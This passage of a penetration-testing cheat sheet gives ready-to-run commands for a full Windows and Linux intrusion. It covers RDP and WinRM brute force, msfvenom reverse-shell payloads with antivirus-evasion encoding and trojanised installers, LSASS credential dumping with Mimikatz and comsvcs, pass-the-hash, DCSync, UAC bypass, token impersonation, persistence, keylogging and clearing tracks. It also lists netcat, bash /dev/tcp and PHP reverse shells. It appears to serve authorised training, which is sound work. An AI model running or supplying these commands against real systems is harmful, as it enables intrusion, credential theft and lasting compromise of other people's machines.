hydra -L /usr/share/metasploit-framework/data/wordlists/common_users.txt -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt rdp://<TARGET_IP> -s <PORT>
```

```bash
xfreerdp /u:<USER> /p:<PW> /v:<TARGET_IP>:<PORT>

xfreerdp /u:<USER> /p:<PW> /v:<TARGET_IP>:<PORT> /w:1920 /h:1080 /fonts /smart-sizing
```

### **WinRM**

```bash
# WINRM
crackmapexec [OPTIONS]
evil-winrm -i <IP> -u <USER> -p <PASSWORD>

nmap --top-ports 7000 <TARGET_IP>
nmap -sV -p 5985 <TARGET_IP>
```

```bash
crackmapexec winrm <TARGET_IP> -u <USER> -p /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt

crackmapexec winrm <TARGET_IP> -u <USER> -p <PW> -x "whoami"
crackmapexec winrm <TARGET_IP> -u <USER> -p <PW> -x "systeminfo"
```

```bash
# Command Shell
evil-winrm.rb -u <USER> -p '<PW>' -i <TARGET_IP>
```

```bash
## METASPLOIT
# WinRM
search type:auxiliary winrm
use auxiliary/scanner/winrm/winrm_auth_methods

# Brute force WinRM login
search winrm_login
use auxiliary/scanner/winrm/winrm_login
set USER_FILE /usr/share/metasploit-framework/data/wordlists/common_users.txt
set PASS_FILE /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt

# Launch command
search winrm_cmd
use auxiliary/scanner/winrm/winrm_cmd
set USERNAME <USER>
set PASSWORD <PW>
set CMD whoami

search winrm_script
use exploit/windows/winrm/winrm_script_exec
set USERNAME <USER>
set PASSWORD <PW>
set FORCE_VBS true
```

### **Payloads**

**MSFVenom shells**

```bash
msfvenom --list payloads
msfvenom --list formats
msfvenom --list encoders

# Win 32bit
msfvenom -a x86 -p windows/meterpreter/reverse_tcp LHOST=<LOCAL_HOST_IP> LPORT=<LOCAL_PORT> -f exe > <PAYLOAD_FILE_x86>.exe

# Win 64bit
msfvenom -a x64 -p windows/x64/meterpreter/reverse_tcp LHOST=<LOCAL_HOST_IP> LPORT=<LOCAL_PORT> -f exe > <PAYLOAD_FILE_x64>.exe

# Linux 32bit
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<LOCAL_HOST_IP> LPORT=<LOCAL_PORT> -f elf > <PAYLOAD_FILE_x86>

# Linux 64bit
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=<LOCAL_HOST_IP> LPORT=<LOCAL_PORT> -f elf > <PAYLOAD_FILE_x64>

# Win 32bit + shikata_ga_nai encoded
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<LOCAL_HOST_IP> LPORT=<LOCAL_PORT> -e x86/shikata_ga_nai -f exe > <PAYLOAD_ENCODED_x86>.exe

# Use more encoding iterations
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<LOCAL_HOST_IP> LPORT=<LOCAL_PORT> -i 10 -e x86/shikata_ga_nai -f exe > <PAYLOAD_ENCODED_x86>.exe

# Linux 32bit + shikata_ga_nai encoded
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<LOCAL_HOST_IP> LPORT=<LOCAL_PORT> -i 10 -e x86/shikata_ga_nai -f elf > <PAYLOAD_ENCODED_x86>

# Inject into Portable Executables
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<LOCAL_HOST_IP> LPORT=<LOCAL_PORT> -e x86/shikata_ga_nai -i 10 -f exe -x winrar-x32-621.exe > winrar.exe

# JSP Java Meterpreter Reverse TCP
msfvenom -p java/jsp_shell_reverse_tcp LHOST=<Local IP Address> LPORT=<Local Port> -f raw > shell.jsp #TomCat content management system 

# PHP
msfvenom -p php/meterpreter_reverse_tcp LHOST=<IP> LPORT=<PORT> -f raw > shell.php\                   #PHP Web Application
cat shell.php | pbcopy && echo '<?php ' | tr -d '\n' > shell.php && pbpaste >> shell.php
```

**MSF Staged and Non Staged Payload**

```bash
# MSF STAGED Payload
windows/x64/meterpreter/reverse_tcp

# MSF NON-STAGED Payload
windows/x64/meterpreter_reverse_https
```

```bash
# Upload the payload on the target and try it with MSFconsole
cd Payloads
sudo python -m http.server 8080
msfconsole -q

use multi/handler
set payload <MSFVENOM_PAYLOAD>
set LHOST <MSFVENOM_LOCAL_HOST_IP>
set LPORT <MSFVENOM_LOCAL_PORT>
run
```

```bash
# Automation
ls -lah /usr/share/metasploit-framework/scripts/resource

# Create a handler resource
nano handler.rc
# Insert the following lines
use multi/handler
set payload windows/meterpreter/reverse_tcp
set LHOST <LOCAL_HOST_IP>
set LPORT <LOCAL_PORT>
run
# Save it and exit

msfconsole -q -r handler.rc

# msfconsole
resource handler.rc

# Export inserted msfconsole commands into a resource script
makerc <FILE>.rc
```

## **Windows Post-Exploitation**

```bash
# METERPRETER
run post/windows/manage/migrate
migrate <pid> #more quickly
## Pivoting
portfwd add -l <LOCAL_PORT> -p <TARGET_PORT> -r <TARGET_IP>
```

```bash
# Manual SHELL TO METERPRETER
background # or CTRL+Z
sessions
search shell_to_meterpreter
use post/multi/manage/shell_to_meterpreter
set SESSION 1
set LHOST <LOCAL_IP>
run

sessions
sessions 2

# Auto SHELL TO METERPRETER
sessions -u 1
sessions 3
```

### **File system discovery**

<pre class="language-bash"><code class="lang-bash">dir /b/s "\*.conf\*"
dir /b/s "\*.txt\*"
dir /b/s "\*filename\*"
cd         #it's the same as 'pwd' command in linux
type       #it's the same as 'cat' command in linux
systeminfo         #information about the Operating System

# Check Users
cat /etc/passwd   #Users in linux  
List drives on the machine

<strong>fsutil fsinfo drives     #Check Drives
</strong><strong>
</strong># MSF Meterpreter
getuid
sysinfo
show_mount
cat C:\\Windows\\System32\\eula.txt
getprivs
pgrep explorer.exe
migrate &#x3C;PROCESS_ID>

# Win CMD - run 'shell' in Meterpreter
## System
hostname
systeminfo
wmic qfe get Caption,Description,HotFixID,InstalledOn

## Users
whoami
whoami /priv
query user
net users
net user &#x3C;USER>
net localgroup
net localgroup Administrators
net localgroup "Remote Desktop Users"

## Network
ipconfig
ipconfig /all
route print
arp -a
netstat -ano
netsh firewall show state
netsh advfirewall show allprofiles

## Services
ps
net start
wmic service list brief
tasklist /SVC
schtasks /query /fo LIST
schtasks /query /fo LIST /v

# Metasploit
use post/windows/gather/enum_logged_on_users
use post/windows/gather/win_privs
use post/windows/gather/enum_logged_on_users
use post/windows/gather/checkvm
use post/windows/gather/enum_applications
use post/windows/gather/enum_computers
use post/windows/gather/enum_patches
use post/windows/gather/enum_shares

# JAWS - Automatic Local Enumeration - Powershell
powershell.exe -ExecutionPolicy Bypass -File .\jaws-enum.ps1 -OutputFilename Jaws-Enum.txt
</code></pre>

### **HTTP/HFS**

```bash
# Meterpreter
sysinfo
getuid
getsystem
getuid
getprivs
hashdump
show_mount
ps
migrate

# msfconsole
use post/windows/manage/migrate
use post/windows/gather/win_privs #CHECK UAC/Privileges
use post/windows/gather/enum_logged_on_users
use post/windows/gather/checkvm
use post/windows/gather/enum_applications
use post/windows/gather/enum_av_excluded
use post/windows/gather/enum_computers
use post/windows/gather/enum_patches
use post/windows/gather/enum_shares
use post/windows/manage/enable_rdp
set SESSION 1

loot
```

### **Dump Hashes**

<pre class="language-powershell"><code class="lang-powershell">#Extracting Credentials from LSASS
#Mimikatz
#To dump credentials from LSASS on a local machine using Invoke-Mimikatz
Invoke-Mimikatz -Command "sekurlsa::ekeys"

#SafetyKatz
#SafetyKatz is a minidump-based approach combined with PELoader to execute Mimikatz
<strong>SafetyKatz.exe "sekurlsa::ekeys"
</strong><strong>
</strong>#SharpKatz
#SharpKatz is a C# implementation of certain Mimikatz functionalities:
SharpKatz.exe --Command ekeys

#Dumpert (Direct System Calls &#x26; API Unhooking)
#Dumpert evades traditional monitoring by leveraging direct system calls:
rundll32.exe C:\Dumpert\Outflank-Dumpert.dll,Dump

#Pypykatz (Python-based Mimikatz Alternative). For extracting credentials using Python
pypykatz.exe live lsa

#Comsvcs.dll for LSASS Dump. A built-in Windows DLL can be leveraged to dump LSASS memory:
tasklist /FI "IMAGENAME eq lsass.exe"
rundll32.exe C:\windows\System32\comsvcs.dll, MiniDump &#x3C;lsass PID> C:\Users\Public\lsass.dmp full
</code></pre>

```bash
# Kiwi - Meterpreter
load kiwi
creds_all
lsa_dump_sam
lsa_dump_secrets

# Mimikatz - Meterpreter
cd C:\\
mkdir Temp
cd Temp
upload /usr/share/windows-resources/mimikatz/x64/mimikatz.exe
shell

mimikatz.exe
privilege::debug
lsadump::sam
lsadump::secrets
sekurlsa::logonPasswords
```

### **Lateral Movement**

**Pass-The-Hash (PTH)**

```powershell
# PASS THE HASH - PSExec
hashdump
exit
search psexec
use exploit/windows/smb/psexec
set payload windows/x64/meterpreter/reverse_tcp
set SMBUser Administrator
set SMBPass <ADMINISTRATOR_LM:NTLM_HASH>
```



#### OverPass-The-Hash (Pass-the-Key)

<pre class="language-powershell"><code class="lang-powershell">#Invoke-Mimikatz
#To perform OPTH with AES256 encryption
Invoke-Mimikatz -Command "sekurlsa::pth /user:Administrator /domain:us.techcorp.local /aes256:&#x3C;aes256key> /run:powershell.exe"

#SafetyKatz
SafetyKatz.exe "sekurlsa::pth /user:administrator /domain:us.techcorp.local /aes256:&#x3C;aes256keys> /run:cmd.exe"

#Rubeus
#For OPTH using NTLM hashes (doesn’t require elevation)
Rubeus.exe asktgt /user:administrator /rc4:&#x3C;ntlmhash> /ptt
<strong>
</strong><strong>#For OPTH with AES256 encryption (requires elevation):
</strong>Rubeus.exe asktgt /user:administrator /aes256:&#x3C;aes256keys> /opsec /createnetonly:C:\Windows\System32\cmd.exe /show /ptt
</code></pre>

#### DCSync Attack (Extracting Credentials from the Domain Controller)

<pre class="language-powershell"><code class="lang-powershell">#Extracting the krbtgt Hash
<strong>#To obtain the krbtgt hash using DCSync (requires Domain Admin privileges):
</strong>Invoke-Mimikatz -Command "lsadump::dcsync /user:us\krbtgt"

#SafetyKatz
SafetyKatz.exe "lsadump::dcsync /user:us\krbtgt"
#By default, Domain Admin privileges are required to execute this attack.
</code></pre>

#### **Start Session**

```powershell
##PSSession
#Creates a new session
New-PSSession

#Interacts with a remote session
Enter-PSSession

##Invoke-Command
#Run a command remotely
Invoke-Command -Scriptblock {Get-Process} -ComputerName (Get-Content <list_of_servers>)

#Execute a script from a file:
Invoke-Command -FilePath C:\scripts\Get-PassHashes.ps1 -ComputerName (Get-Content <list_of_servers>)

#Run a locally defined function on remote machines:
Invoke-Command -ScriptBlock ${function:Get-PassHashes} -ComputerName (Get-Content <list_of_servers>)
Pass arguments to a remote function (only positional arguments allowed):
Invoke-Command -ScriptBlock ${function:Get-PassHashes} -ComputerName (Get-Content <list_of_servers>) -ArgumentList <args>
Maintain a stateful session:
$Sess = New-PSSession -ComputerName Server1
Invoke-Command -Session $Sess -ScriptBlock {$Proc = Get-Process}
Invoke-Command -Session $Sess -ScriptBlock {$Proc.Name}
```

## **Windows Privilege Escalation**

```powershell
# PrivescCHECK - PowerShell script
powershell -ep bypass -c ". .\PrivescCheck.ps1; Invoke-PrivescCheck -Extended -Report PrivescCheck_%COMPUTERNAME% -Format TXT,CSV,HTML,XML"

## Basic mode
powershell -ep bypass -c ". .\PrivescCheck.ps1; Invoke-PrivescCheck"

## Extended Mode + Export Txt Report
powershell -ep bypass -c ". .\PrivescCheck.ps1; Invoke-PrivescCheck -Extended -Report PrivescCheck_%COMPUTERNAME%"
```

### **Kernel**

```bash
# WIN KERNEL
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<LOCAL_HOST_IP> LPORT=<LOCAL_PORT> -f exe -o payload.exe

python3 -m http.server
# Download payload.exe on target
```

```bash
## Windows-Exploit-Suggester Install
mkdir Windows-Exploit-Suggester
cd Windows-Exploit-Suggester
wget https://raw.githubusercontent.com/AonCyberLabs/Windows-Exploit-Suggester/f34dcc186697ac58c54ebe1d32c7695e040d0ecb/windows-exploit-suggester.py
# ^^ This is a python3 version of the script

cd Windows-Exploit-Suggester
python ./windows-exploit-suggester.py --update
pip install xlrd --upgrade

./windows-exploit-suggester.py --database YYYY-MM-DD-mssb.xlsx --systeminfo win7sp1-systeminfo.txt

./windows-exploit-suggester.py --database YYYY-MM-DD-mssb.xlsx --systeminfo win2008r2-systeminfo.txt
```

```bash
## METASPLOIT
## Global set
setg RHOSTS <TARGET_IP>
setg RHOST <TARGET_IP>

use exploit/multi/handler 
options
set payload windows/x64/meterpreter/reverse_tcp
set LHOST <LOCAL_HOST_IP>
set LPORT <LOCAL_PORT>

use post/multi/recon/local_exploit_suggester
set SESSION <HANDLER_SESSION_NUMBER>

## MsfConsole Meterpreter Privesc
getprivs
getsystem

# Exploitable vulnerabilities modules
exploit/windows/local/bypassuac_dotnet_profiler
exploit/windows/local/bypassuac_eventvwr
exploit/windows/local/bypassuac_sdclt
exploit/windows/local/cve_2019_1458_wizardopium
exploit/windows/local/cve_2020_1054_drawiconex_lpe
exploit/windows/local/ms10_092_schelevator
exploit/windows/local/ms14_058_track_popup_menu
exploit/windows/local/ms15_051_client_copy_image
exploit/windows/local/ms16_014_wmi_recv_notif
```

### **UAC**

```bash
# UAC - UACME

msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<LOCAL_HOST_IP> LPORT=<LOCAL_PORT> -f exe > backdoor.exe

## METASPLOIT - Listening
setg RHOSTS <TARGET_IP>
setg RHOST <TARGET_IP>

use exploit/multi/handler 
set payload windows/x64/meterpreter/reverse_tcp
set LHOST <LOCAL_HOST_IP>
set LPORT <LOCAL_PORT>

## Meterpreter (Unprivileged session)
cd C:\\
mkdir Temp
cd Temp
upload /root/backdoor.exe
upload /root/Desktop/tools/UACME/Akagi64.exe
shell
Akagi64.exe 23 C:\Temp\backdoor.exe

akagi32.exe [Key] [Param]
akagi64.exe [Key] [Param]

## Elevated Meterpreter Received on the listening session
ps -S lsass.exe
migrate <lsass_PID>
hashdump
```

### **Access Token**

```bash
# ACCESS TOKEN IMPERSONATION

## METASPLOIT - Meterpreter (Unprivileged session)
pgrep explorer
migrate <explorer_PID>
getuid
getprivs

load incognito
list_tokens -u
impersonate_token "ATTACKDEFENSE\Administrator"
getuid
getprivs # Access Denied
pgrep explorer
migrate <explorer_PID>
getprivs
list_tokens -u
impersonate_token "NT AUTHORITY\SYSTEM"
```

### **Windows Credential Dumping**

```bash
# Exploitation
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<TARGET_IP> LPORT=1234 -f exe > payload.exe

python -m SimpleHTTPServer 80

## METASPLOIT
setg RHOSTS <TARGET_IP>
setg RHOST <TARGET_IP>

use exploit/multi/handler 
set payload windows/x64/meterpreter/reverse_tcp
set LHOST <LOCAL_HOST_IP>
set LPORT <LOCAL_PORT>
run

## On target system
certutil -urlcache -f http://<TARGET_IP>/payload.exe payload.exe
# Run payload.exe

# METASPLOIT - Meterpreter
sysinfo
getuid
pgrep lsass
migrate <explorer_PID>
getprivs

# Creds dumping - Meterpreter
load kiwi
creds_all
lsa_dump_sam
lsa_dump_secrets

# MIMIKATZ
cd C:\\
mkdir Temp
cd Temp
upload /usr/share/windows-resources/mimikatz/x64/mimikatz.exe
shell

mimikatz.exe
privilege::debug
lsadump::sam
lsadump::secrets
sekurlsa::logonPasswords

# PASS THE HASH
## sekurlsa::logonPasswords
background
search psexec
use exploit/windows/smb/psexec
set LPORT <LOCAL_PORT2>
set SMBUser Administrator
set SMBPass <ADMINISTRATOR_LM:NTLM_HASH>
exploit
```

```
crackmapexec smb <TARGET_IP> -u Administrator -H "<NTLM_HASH>" -x "whoami"
```

### **Token Impersonation**

```bash
# Privilege Escalation - Meterpreter
getuid
getprivs
hashdump
load incognito
list_tokens -u
impersonate_token "ATTACKDEFENSE\Administrator"
getuid
ps
migrate <PID>
hashdump
```

#### Relaying

```powershell
##PowerShell
#Get services with unquoted paths and a space in their name
Get-WmiObject -Class win32_service | select pathname

#Check permissions info regarding a service
sc.exe sdshow <service_name>

##PowerUp
#Run all PrivEsc checks
Invoke-AllChecks

##PrivEsc
#Run all PrivEsc checks
Invoke-PrivEscCheck

##WinPeas
#Run all PrivEsc checks
winPEASx64.exe
```

### Unquoted Service Path

<pre class="language-powershell"><code class="lang-powershell"><strong>##PowerUp
</strong>#List path for windows services:
Get-WmiObject -Class win32_service | select pathname
#Get services with unquoted paths and a space in their name:
Get-ServiceUnquoted -Verbose
#Get services where the current user can write to its binary path and change arguments to the binary:
Get-ModifiableServiceFile -Verbose
#Get the services whose configuration current user can be modified:
Get-ModifiableServiceFile -Verbose
</code></pre>

#### [**Feature Abuse**](readme/network-security-3/network-security/2.1.md)

#### [GPO Abuse](readme/network-security-3/network-security/5.1.3-gpo-abuse.md)

## **Persistence**

```bash
# Administrative Privileges required!

# RDP - Meterpreter
background

use exploit/windows/local/persistence_service
#or search platform:windows persistence
set payload windows/meterpreter/reverse_tcp
set SESSION 1

# Regain access
use multi/handler
set payload windows/meterpreter/reverse_tcp
set LHOST <LOCAL_IP>
set LPORT <LOCAL_PORT>

# Enabling RDP
use post/windows/manage/enable_rdp
sessions
set SESSION 1

# Meterpreter - Enable RDP
run getgui -e -u <NEWUSER> -p <PW>
```

```bash
# KEYLOGGING - Meterpreter
keyscan_start
keyscan_dump
keyscan_stop
```

**Clearing tracks**

```bash
# Meterpreter
clearenv
```

## **Shells**

```bash
# NETCAT - Install
sudo apt update && sudo apt install -y netcat
# or upload the nc.exe on the target machine

nc <TARGET_IP> <TARGET_PORT>
nc -nv <TARGET_IP> <TARGET_PORT>
nc -nvu <TARGET_IP> <TARGET_UDP_PORT>

## NC Listener
nc -nvlp <LOCAL_PORT>
nc -nvlup <LOCAL_UDP_PORT>

## Transfer files
# Target machine
nc.exe -nvlp <PORT> > test.txt
# Attacker machine
echo "Hello target" > test.txt
nc -nv <TARGET_IP> <TARGET_PORT> < test.txt
```

```bash
# BIND SHELL

## Target Win machine - Bind shell listener with executable cmd.exe
nc.exe -nvlp <PORT> -e cmd.exe
## Attacker Linux machine
nc -nv <TARGET_IP> <PORT>

## Target Linux machine - Bind shell listener with /bin/bash
nc -nvlp <PORT> -c /bin/bash
## Attacker Win machine
nc.exe -nv <TARGET_IP> <TARGET_PORT>
```

```bash
# REVERSE SHELL

## Attacker Linux machine
nc -nvlp <PORT>
## Target Win machine
nc.exe -nv <ATTACKER_IP> <ATTACKER_PORT> -e cmd.exe

## Attacker Linux machine
nc -nvlp <PORT>
## Target Linux machine
nc -nv <ATTACKER_IP> <ATTACKER_PORT> -e /bin/bash
```

```bash
# Spawn shells
python -c 'import pty; pty.spawn("/bin/sh")'
import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<TARGET_IP>",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")
echo os.system('/bin/bash')
/bin/sh -i
bash -i >& /dev/tcp/<TARGET_IP>/4444 0>&1
<?php exec("/bin/bash -c 'bash -i >& /dev/tcp/<TARGET_IP>/4444 0>&1'"); ?>
/usr/bin/script -qc /bin/bash /dev/null
perl -e 'exec "/bin/sh";'
perl: exec "/bin/sh";
ruby: exec "/bin/sh"
lua: os.execute('/bin/sh')
IRB: exec "/bin/sh"
vi: :!bash
vi: :set shell=/bin/bash:shell
nmap: !sh
```

## **Obfuscation**

```bash
# SHELLTER - Install
sudo apt update && sudo apt install -y shellter
sudo dpkg --add-architecture i386 && sudo apt update && sudo apt -y install wine32
rm -r ~/.wine

cd /usr/share/windows-resources/shellter
sudo shellter

mkdir AVBypass
cd AVBypass
cp /usr/share/windows-binaries/vncviewer.exe .
# Proceed in Sellter window
```

```bash
# INVOKE-OBFUSCATION PowerShell script - Install
cd /opt
sudo git clone https://github.com/danielbohannon/Invoke-Obfuscation.git
sudo apt update && sudo apt install -y powershell

pwsh
cd /opt/Invoke-Obfuscation/
Import-Module ./Invoke-Obfuscation.psd1
cd ..
Invoke-Obfuscation
```

## **Transferring Files**

```bash
# PYTHON WEB SERVER
python -V
python3 -V
py -v # on Windows

# Python 2.7
python -m SimpleHTTPServer <PORT_NUMBER>

# Python 3.7
python3 -m http.server <PORT_NUMBER>

# On Windows, try 
python -m http.server <PORT>
py -3 -m http.server <PORT>
```

## **Shells**

```bash
cat /etc/shells
    # /etc/shells: valid login shells
    /bin/sh
    /bin/dash
    /bin/bash
    /bin/rbash

/bin/bash -i

/bin/sh -i
```

### **TTY Shells**

```bash
# BASH
/bin/bash -i
/bin/sh -i
SHELL=/bin/bash script -q /dev/null

# Setup environment variables
export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
export TERM=xterm
export SHELL=/bin/bash
```

```bash
# PYTHON
python --version
python -c 'import pty; pty.spawn("/bin/bash")'

## Fully Interactive TTY
# Background (CTRL+Z) the current remote shell
stty raw -echo && fg
# Reinitialize the terminal with reset
reset
```

```bash
# FULL TTY PYTHON3 SHELL
python3 -c 'import pty; pty.spawn("/bin/bash")'
# Background CTRL+Z
stty raw -echo && fg
# ENTER
export SHELL=/bin/bash
export TERM=screen
stty rows 36 columns 157
# stty -a to get the rows & columns of the attacker terminal
reset
```

```bash
# PERL
perl -h
perl -e 'exec "/bin/bash";'
```

## **Dumping & Cracking**

```bash
hashdump  #using Metasploit

# JohnTheRipper
john --list=formats | grep NT
john --format=NT hashes.txt

gzip -d /usr/share/wordlists/rockyou.txt.gz
john <Hash_Password-File> --wordlist=/usr/share/wordlists/rockyou.txt # To crack the password from your previous output (hashdump,shadow file )
john --format=NT win_hashes.txt --wordlist=/usr/share/wordlists/rockyou.txt

john -wordlist /usr/share/wordlists/rockyou.txt crack.hash
john -wordlist /usr/share/wordlists/rockyou.txt -users users.txt test.hash

#this is another way to crack passwords (that requires shadow file with passwd file)
unshadow passwd shadow > unshadowed.txt
john --wordlist=/usr/share/wordlists/rockyou.txt unshadowed.txt

hashcat -a 3 -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt
hashcat -a 3 -m 1000 --show hashes.txt /usr/share/wordlists/rockyou.txt
hashcat -m 1000 -a 0 -o found.txt --remove crack.hash rockyou-10.txt
```

## **Tools Installation**

```bash
# Gobuster - Install
sudo apt update && sudo apt install -y gobuster

# Dirbuster - Install
sudo apt update && sudo apt install -y dirb

# Nikto - Install
sudo apt update && sudo apt install -y nikto

# BurpSuite - Install
sudo apt update && sudo apt install -y burpsuite

# SQLMap - Install
sudo apt update && sudo apt install -y sqlmap

# XSSer - Install
sudo apt update && sudo apt install -y xsser

# WPScan - Install
sudo apt update && sudo apt install -y wpscan

# Hydra - Install
sudo apt update && sudo apt install -y hydra
```

